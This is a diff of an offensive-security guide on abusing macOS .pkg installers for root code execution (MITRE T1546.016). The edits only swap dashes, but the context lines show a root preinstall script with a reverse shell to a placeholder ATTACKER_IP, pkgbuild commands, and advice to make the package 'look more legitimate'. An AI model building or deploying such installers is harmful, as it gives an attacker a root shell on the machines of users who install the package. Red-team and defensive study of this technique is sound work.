@@ -2,7 +2,7 @@
 
 Abuse `.pkg` installers and the macOS Installer framework for privilege escalation and code execution.
 
-**MITRE ATT&CK**: T1546.016 — Installer Packages
+**MITRE ATT&CK**: T1546.016 - Installer Packages
 
 ---
 
@@ -18,7 +18,7 @@ macOS `.pkg` files can contain pre/post-install scripts that run as **root** dur
 
 ```bash
 #!/bin/bash
-# scripts/preinstall — runs BEFORE file installation, as root
+# scripts/preinstall - runs BEFORE file installation, as root
 
 # Reverse shell
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
@@ -81,7 +81,7 @@ pkgbuild \
     /tmp/update.pkg
 ```
 
-### Build with productbuild (Distribution Package — looks more legitimate)
+### Build with productbuild (Distribution Package - looks more legitimate)
 
 ```bash
 # Create distribution.xml
